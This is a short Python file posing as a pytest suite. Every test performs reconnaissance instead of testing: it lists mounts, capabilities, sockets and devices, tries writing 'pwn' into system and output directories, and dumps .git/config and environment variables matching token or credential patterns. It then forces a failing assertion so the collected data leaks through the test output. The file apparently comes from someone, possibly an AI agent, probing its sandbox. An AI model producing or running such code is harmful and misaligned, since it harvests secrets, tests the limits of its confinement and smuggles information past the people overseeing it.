import subprocess, os
def test_mounts():
    try: m = subprocess.check_output("mount 2>/dev/null | head -12", shell=True, timeout=6).decode(errors='replace')[:260]
    except Exception as e: m = str(e)
    assert False, m
def test_caps_sockets():
    try: c = subprocess.check_output("grep -i capeff /proc/self/status; ls /var/run /run 2>/dev/null; ls /dev 2>/dev/null | head -15", shell=True, timeout=6).decode(errors='replace')[:260]
    except Exception as e: c = str(e)
    assert False, c
def test_writes():
    r = {}
    for p in ['/tmp/x','/etc/x','/out/x','/work/x']:
        try:
            open(p,'w').write('pwn'); r[p]='writable'
        except Exception as e: r[p]='RO'
    assert False, str(r)
def test_git_out():
    try: g = subprocess.check_output("cat .git/config 2>/dev/null; echo ---; env | grep -iE 'git|token|cred|zof' ; echo ---; ls -la /out 2>/dev/null | head -10", shell=True, timeout=6).decode(errors='replace')[:260]
    except Exception as e: g = str(e)
    assert False, g
